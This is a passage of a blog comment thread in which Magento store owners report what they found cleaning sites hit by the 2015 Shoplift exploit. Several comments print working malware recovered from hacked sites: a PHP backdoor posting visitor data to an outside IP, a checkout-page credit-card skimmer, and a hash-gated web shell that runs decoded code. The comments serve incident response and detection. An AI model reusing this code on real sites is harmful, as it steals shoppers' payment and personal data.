	<ul class="children">

	<li class="comment even depth-2" id="comment-6249">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T11:11:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6249">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Any other changes you&#8217;ve found?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-6250">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/51b400f4974a833e8d3f9f065f8348f6?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/51b400f4974a833e8d3f9f065f8348f6?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">cd7</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T13:18:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6250">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>It could come together why there was starting be active month-two ago POST requests to Magento Connect Install</p>
<p>    POST /downloader/index.php?A=loggedin</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6243">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/83bc4e7e22243b09010695c451d696a4?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/83bc4e7e22243b09010695c451d696a4?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">TheloMonk</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T08:30:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6243">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>For my magento site, the created  admin user was gxer et the email <a href="mailto:gxer@example.com">gxer@example.com</a></p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6246">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ifnull</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T08:51:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6246">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Usernames are random 4 character. Look for email address <a href="mailto:email@example.com">email@example.com</a>.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6273">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2f14690038624a4867f62a3639b07e94?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2f14690038624a4867f62a3639b07e94?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Mike</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T18:40:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6273">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I checked all core files and they&#8217;ve modified the Mysql.php and IndexController.php in Magento Version 1.7.0.1 &#8211; I also compared the actual database with an unhacked mysql dump, but can&#8217;t find anything.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6288">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1aedb8d9dc4751e229a335e371db8058?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1aedb8d9dc4751e229a335e371db8058?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">test</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-29T09:28:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6288">April 29, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>ypwq or vpwq???</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-6291">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-29T14:00:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6291">April 29, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Also there is new code injection in /js/index.php </p>
<p>// no files specified return 404</p>
<p>$id=str_replace(&#8220;www.&#8221;, &#8220;&#8221;, $_SERVER[&#8216;HTTP_HOST&#8217;]);</p>
<p>//checking if client have older copy then we have on server</p>
<p>$url=&#8217;http://217.12.204.163/obf.php&#8217;;</p>
<p>if($_COOKIE[&#8220;SESSIID&#8221;]!=&#8221;&#8221;){</p>
<p>    // try automatically get content type if requested</p>
<p>    $url=$url.&#8217;?a=&#8217;.$_COOKIE[&#8220;SESSIID&#8221;]; </p>
<p>    $data=json_encode(array(&#8216;request&#8217;=&gt;$_REQUEST, &#8216;ip&#8217;=&gt;$_SERVER[&#8216;REMOTE_ADDR&#8217;],&#8217;ua&#8217;=&gt;$_SERVER[&#8216;HTTP_USER_AGENT&#8217;],&#8217;cookie&#8217;=&gt;$_COOKIE[&#8220;SESSIID&#8221;],&#8217;date_unix&#8217;=&gt;time())); </p>
<p>    $data=base64_encode($data);</p>
<p>    $ch = curl_init(); </p>
<p>    // set custom content type if specified</p>
<p>    curl_setopt($ch, CURLOPT_URL,$url); </p>
<p>    curl_setopt($ch, CURLOPT_POST, 1); </p>
<p>    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array(&#8216;data&#8217;=&gt;$data,&#8217;utmp&#8217;=&gt;$id))); </p>
<p>    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); </p>
<p>    curl_exec ($ch); </p>
<p>    curl_close ($ch); </p>
<p>} else{</p>
<p>    // try automatically get content type if requested</p>
<p>    $rand=rand(1,9999999999);</p>
<p>    setcookie(&#8220;SESSIID&#8221;, $rand,time()+3600);</p>
<p>    $data=json_encode(array(&#8216;request&#8217;=&gt;$_REQUEST, &#8216;ip&#8217;=&gt;$_SERVER[&#8216;REMOTE_ADDR&#8217;],&#8217;ua&#8217;=&gt;$_SERVER[&#8216;HTTP_USER_AGENT&#8217;],&#8217;cookie&#8217;=&gt;$rand,&#8217;date_unix&#8217;=&gt;time())); </p>
<p>    $data=base64_encode($data);</p>
<p>    $url=$url.&#8217;?a=&#8217;.$rand; </p>
<p>    $ch = curl_init(); </p>
<p>    // set custom content type if specified</p>
<p>    curl_setopt($ch, CURLOPT_URL,$url); </p>
<p>    curl_setopt($ch, CURLOPT_POST, 1); </p>
<p>    curl_setopt($ch, CURLOPT_POSTFIELDS,http_build_query(array(&#8216;data&#8217;=&gt;$data,&#8217;utmp&#8217;=&gt;$id))); </p>
<p>    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); </p>
<p>    curl_exec ($ch); </p>
<p>    curl_close ($ch); </p>
<p>}</p>
<p>and in /js/lib/ccard.js</p>
<p>var snd =null;</p>
<p>window.onload = function () {</p>
<p>    if((new RegExp(&#8216;onepage|onestepcheckout|firecheckout|onestepquickcheckout|simplecheckout|checkout&#8217;)).test(window.location)) {</p>
<p>        send();</p>
<p>    }</p>
<p>};</p>
<p>function clk() {</p>
<p>    var inp=document.querySelectorAll(&#8220;input, select, textarea, checkbox&#8221;);</p>
<p>    for (var i=0;i0) {</p>
<p>        var nme=inp[i].name;</p>
<p>        if(nme==&#8221;) { nme=i; }</p>
<p>        snd+=inp[i].name+&#8217;=&#8217;+inp[i].value+&#8217;&amp;&#8217;;</p>
<p>        }</p>
<p>    }</p>
<p>}</p>
<p>function send() {</p>
<p>    var btn=document.querySelectorAll(&#8220;button, input, submit, .btn, .button&#8221;);</p>
<p>    for (var i=0;i&lt;btn.length;i++){</p>
<p>        var b=btn[i];</p>
<p>        if(b.type!=&#039;text&#039; &amp;&amp; b.type!=&#039;slect&#039; &amp;&amp; b.type!=&#039;checkbox&#039; &amp;&amp; b.type!=&#039;password&#039; &amp;&amp; b.type!=&#039;radio&#039;) {</p>
<p>            if(b.addEventListener) {</p>
<p>                b.addEventListener(&quot;click&quot;, clk, false);</p>
<p>            }else {</p>
<p>                b.attachEvent(&#039;onclick&#039;, clk);</p>
<p>            }</p>
<p>        }</p>
<p>    }</p>
<p>    var frm=document.querySelectorAll(&quot;form&quot;);</p>
<p>    for (var i=0;i&lt;frm.length;i++){</p>
<p>        if(frm[i].addEventListener) {</p>
<p>            frm[i].addEventListener(&quot;submit&quot;, clk, false);</p>
<p>        }else {</p>
<p>            frm[i].attachEvent(&#039;onsubmit&#039;, clk);</p>
<p>        }</p>
<p>    }</p>
<p>    if(snd!=null) {</p>
<p>        console.clear();</p>
<p>	var cc = new RegExp(&quot;[0-9]{13,16}&quot;);</p>
<p>		var asd=&quot;0&quot;;</p>
<p>       if(cc.test(snd)){</p>
<p>		  asd=&quot;1&quot; ;</p>
<p>	   }</p>
<p>var http = new XMLHttpRequest();</p>
<p>http.open(&quot;POST&quot;,&quot;/js/index.php&quot;,true);</p>
<p>http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</p>
<p>http.send(&quot;data=&quot;+snd+&quot;&amp;asd=&quot;+asd);</p>
<p>console.clear();</p>
<p>    }</p>
<p>    snd=null;</p>
<p>    setTimeout(&#039;send()&#039;, 150);</p>
<p>}</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-6301">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T05:05:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6301">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>so far I haven&#8217;t seen this in any of my hacked sites either, but thanks for the heads up, i&#8217;ll keep my eyes peeled.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-6385">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Shaun Ek</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-21T02:07:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6385">May 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I have found this same vulnerability on a site I am cleaning up. It was very similar. It grabs form fields from pages (any page, including checkout) and submits to their server&#8230; I changed the url and build my own endpoint and verified that it works and yes they got personal and credit card information. 🙁</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6292">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-29T14:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6292">April 29, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>And new file in /js/api.php</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6300">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T05:05:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6300">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>so far I haven&#8217;t seen this in any of my hacked sites, but thanks for the heads up, i&#8217;ll keep my eyes peeled.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6303">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T13:23:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6303">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>the content of this file is in comment above! 🙂</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-6307">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T21:30:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6307">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for keeping everyone else updated with your findings, super helpful for others dealing with hacked sites!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6293">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-29T14:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6293">April 29, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>$hash = &#8217;92bde3b96aff934ed67420a3f6130ac2&#8242;;</p>
<p>if (md5($_POST[&#8216;hash&#8217;]) === $hash) {</p>
<p>	mage($_POST[&#8216;code&#8217;]);</p>
<p>	if (isset($_POST[&#8216;clean&#8217;]))</p>
<p>		clean();</p>
<p>}</p>
<p>function mage($code)</p>
<p>{</p>
<p>	$b = &#8216;b&#8217;.&#8217;as&#8217;.&#8217;e&#8217;.&#8217;6&#8242;.&#8217;4&#8242;.&#8217;_&#8217;.&#8217;d&#8217;.&#8217;eco&#8217;.&#8217;de&#8217;;</p>
<p>	$code = $b($code);</p>
<p>	$file = &#8216;no_image.gif&#8217;;</p>
<p>	$fp = fopen($file, &#8216;w&#8217;);</p>
<p>	fwrite($fp, $code);</p>
<p>	fclose($fp);</p>
<p>	if (is_file($file))</p>
<p>		@include($file);</p>
<p>}</p>
<p>function clean()</p>
<p>{</p>
<p>	@unlink(&#8216;no_image.gif&#8217;);</p>
<p>}</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6299">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T04:59:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6299">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>which file are you seeing this in?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6369">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f55f89228f5df9b9d0f61a8103ae2afd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f55f89228f5df9b9d0f61a8103ae2afd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Tor</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-14T23:30:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6369">May 14, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I get this too in /js/api.php after comparing to Magento 1.9.1 core files I can&#8217;t see the file in there at all</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-3" id="comment-6987">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2e916dff91ce38b6726f8cd605be331f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2e916dff91ce38b6726f8cd605be331f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Gabriel Molina</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-11-25T10:41:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6987">November 25, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi redesigned, I hope this topic is not yet closed. I have this problem with the media/dhl/info.php. This file is weird. Had you encountered this before? The file codes looks like it&#8217;s fetching details from our magento site. I did some research and found out that it&#8217;s not only me who has this problem. here&#8217;s the code: </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6304">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T14:36:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6304">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;ve had another problem. On one of my sites </p>
<p>After patching, removing false admin users, and cleaning files, next day there where two new false admin users in backend. I have even blocked the class of IPs in .htaccess. And it didn&#8217;t help&#8230; </p>
<p>It starts to be really scarry, if all the magento shops are in danger.</p>
<p>Have you had the same?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6311">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-01T22:18:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6311">May 1, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>No, I haven&#8217;t seen any additional signs of intrusion in any site I&#8217;ve fixed.  are you sure the patch applied 100%, hacked sites have an altered /lib/Varian/Db/Adaptor/Pdo/Mysql.php file, so the patch will fail against that file, it has to be patched manually or replaced.</p>
<p>If that isn&#8217;t the issue it sounds like your site has an additional intrusion point that you haven&#8217;t yet detected.  You&#8217;ll want to restore from a pre-hack backup, or if not scan everything carefully.  If the site doesn&#8217;t have any core files changed, which hopefully it doesn&#8217;t you can overwrite the magento with a fresh copy of the same version number, or do a upgrade.</p>
<p>Best of luck figuring things out.  Dealing with a hacked site is no fun!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6319">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-04T12:39:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6319">May 4, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I have had another problem.<br />
I have cleaned one other site of our client. I mean I have<br />
&#8211; removed the admin users<br />
&#8211; block in htaccess both IPs<br />
&#8211; cleand index.php from the root<br />
&#8211; and applyed the PATCH</p>
<p>But after the weekend the index.php has been once again changed, and the code has been injected :</p>
<p>if (preg_match(&#8216;//admin/Cms_Wysiwyg/directive/index//&#8217;, $_SERVER[&#8216;REQUEST_URI&#8217;])) {<br />
    if ($_SERVER[&#8216;REQUEST_METHOD&#8217;] == &#8216;POST&#8217;) {<br />
        if (isset($_REQUEST[&#8216;___directive&#8217;]) &amp;&amp; isset($_REQUEST[&#8216;forwarded&#8217;])) {<br />
            if (preg_match(&#8216;/report_search_grid/&#8217;, base64_decode($_REQUEST[&#8216;___directive&#8217;])))<br />
                $_REQUEST[&#8216;forwarded&#8217;] = $_POST[&#8216;forwarded&#8217;] = $_GET[&#8216;forwarded&#8217;] = $_COOKIE[&#8216;forwarded&#8217;] = null;<br />
            }<br />
    }<br />
}</p>
<p>Have you had the same problem? Where can I find the solution for this problem?<br />
I have been looking for MagePleasure module, but it doesn&#8217;t exist in<br />
&#8211; code/local nor in<br />
&#8211; code/core</p>
<p>The one thing that I can see is that many folders has 777 access rights, so I will change the access rights for the files and folders.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6388">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Shaun Ek</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-21T05:58:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6388">May 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I also had the same code in a site&#8217;s /index.php, no Magepleasure module.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6322">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/85fdd8c6444ad778105a9ac55a0e6eb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">el polaco</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-05T13:07:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6322">May 5, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>OK I have new malware found on my site but I am not sure if it is connected to the ShopLift </p>
<p>files :<br />
/media/dhl/info.php<br />
/media/dhl/.htaccess<br />
/js/flash/FrontendHtml.phar.php (binary file)<br />
/js/extjs/resources/images/magento/basic-dialog/MagentoLib.php</p>
<p>if you wish I can send you the content of all files</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6387">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/057a7027b3abfb0df623c45a8a523200?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Shaun Ek</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-21T05:34:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6387">May 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
